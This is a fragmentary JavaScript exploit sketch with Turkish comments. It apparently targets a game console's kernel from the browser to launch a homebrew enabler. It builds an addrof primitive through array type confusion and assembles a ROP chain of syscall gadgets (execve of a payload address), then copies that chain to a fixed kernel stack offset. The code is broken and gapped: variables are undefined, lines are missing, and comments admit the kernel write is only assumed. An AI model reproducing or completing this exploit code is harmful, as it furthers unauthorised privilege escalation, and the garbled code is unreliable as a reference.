    var uintArr = new Uint32Array(floatArr.buffer);
    function addrof(obj) {
        floatArr[0] = obj;
        return uintArr[0];
    }

        uintArr[0] = addr;

        // Burada gerçekte addrof ile bir kernel nesnesi alınır,

        // Gerçekte burada addrof ile elde edilen bir ArrayBuffer üzerinden

        var view = new Uint8Array(buf);
        view.set(data);
        // Burada buf'ın adresini alıp kernel adresine kopyalamak gerekir.
        // Bu örnekte sadece kopyalandığını varsayıyoruz.

        return true;

        rop.push(popRax & 0xFFFFFFFF, 0x201); // sys_write (9.00)
        rop.push(syscall & 0xFFFFFFFF);
        // sys_execve(henAddr, NULL, NULL)
        rop.push(popRdi & 0xFFFFFFFF, henAddr & 0xFFFFFFFF);
        rop.push(popRsi & 0xFFFFFFFF, 0);
        rop.push(popRdx & 0xFFFFFFFF, 0);
        rop.push(popRax & 0xFFFFFFFF, 0x3B);
        rop.push(syscall & 0xFFFFFFFF);
        return rop;
    }
    var ropChain = buildROP(henKernelAddr);

    // 9. ROP'u kernel stack'ine yaz
    var ropKernelAddr = kernelBase + 0x95000;
    var ropBytes = new Uint8Array(ropChain.length * 4);
    for (var i = 0; i < ropChain.length; i++) {

        ropBytes[i*4+3] = (v>>24) & 0xFF;
